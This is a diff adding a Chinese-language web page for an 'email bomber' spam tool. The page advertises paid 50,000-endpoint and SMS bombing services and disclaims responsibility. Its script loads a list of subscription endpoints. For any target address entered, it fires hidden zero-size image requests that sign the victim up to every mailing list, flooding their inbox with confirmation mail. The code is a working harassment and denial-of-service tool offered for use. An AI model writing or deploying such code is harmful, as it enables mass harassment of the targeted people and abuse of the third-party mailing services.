@@ -1,0 +1,87 @@
+<head>
+    <meta charset="UTF-8">
+    <title>【海市蜃楼】邮件测压-垃圾邮件发送器</title>
+    <link rel="stylesheet" href="css/materialize.min.css">
+    <script src="js/jquery.min.js"></script>
+    <script src="js/materialize.min.js"></script>
+</head>
+<body>
+<div class="row" style="padding-top: 20px">
+    <div class="col s12 m6 offset-m3">
+        <div class="card">
+            <div class="card-content">
+                <p class="card-title">邮件轰炸机</p>
+                <p>欢迎来到我的分站</p></p>
+                <p>目前为低威力，欢迎大家光临本站。
+                如果你喜欢本站请务必推广给你的朋友。
+                <a target="_blank" href="http://tool.6z6.xyz/lens/go/">碧罗现身器</a>(不用介绍)</p>
+                <p>需要这个邮箱测压网源码的请联系<a target="_blank" href="https://qm.qq.com/cgi-bin/qm/qr?k=Gr9zxGcA0LhharFiC-nbD_6e6rDTK_8X&noverify=0">我的QQ</a> 此外<a target="_blank" href="5W.PNG">查看5万接口 </a><a target="_blank" href="http://tool.6z6.xyz/bomb">短信测压</a></a></p>
+                <p>本站目前可发送-<span id="node-count">{{加载中...}}</span>-封邮件。</p>
+                <p>网页版仅供测试，如果不进垃圾箱一分钟稳800条验证码,不限邮箱平台！</p>
+                <p>目前使用的接口仅为1000条，5万轰炸接口请联系站长付费体验。</p>
+                <p><b>免责声明：仅供娱乐使用。对于违反相关法律、造成危害的滥用行为，开发者-站长不负任何责任。</b></p>
+                <div class="divider" style="margin: 30px auto"></div>
+                <div class="row">
+                    <div class="input-field col s9">
+                        <input type="email" id="email" class="" placeholder="email@example.com">
+                        <label>目标邮箱地址：</label>
+                    </div>
+                    <div class="input-field col s3">
+                        <a href="#!" id="start-bombing" onclick="start_bombing($('#email').val())" class="btn waves-effect" disabled>开始轰炸</a>
+                    </div>
+                </div>
+            </div>
+            <div class="card-action"><i>&copy;海市蜃楼 2020-2021<br/>反馈QQ群935671099</i></div>
+        </div>
+    </div>
+</div>
+<div id="iframe-container"></div>
+<script>
+    function generatePassword(length) {
+        var result           = '';
+        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for ( var i = 0; i < length; i++ ) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+    }
+    function validateEmail(email) {
+        const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+        return re.test(String(email).toLowerCase());
+    }
+    function start_bombing(email){
+        if(!validateEmail(email)){
+            M.toast({html:'邮箱格式不正确'});
+            return;
+        }
+        nodes.forEach(node => {
+            var password=generatePassword(10);
+            $('#iframe-container').append(`
+                <img
+                src='`+node+`?email=`+email+`&fullname=&pw=`+password+`&pw-conf=`+password+`&language=en&digest=0&email-button=Subscribe'
+                width='0'
+                height='0'></img>
+            `);
+        });
+        M.toast({html:'已开始轰炸，请等待页面加载完成'});
+        $('#start-bombing').attr('disabled',1);
+    }
+    var nodes=[];
+    $(function () {
+        $.ajax('kali/theync_xyz_yyds_refined_nodes.json',{
+            type:'get',
+            success(data){
+                nodes=data;
+                M.toast({html:'系统准备完毕!'});
+                $('#start-bombing').removeAttr('disabled');
+                $('#node-count').text(nodes.length);
+            },
+            error(resp){
+                M.toast({html:'网络出错，请刷新页面'});
+            }
+        })
+    });
+</script>
+</body>
+</html>
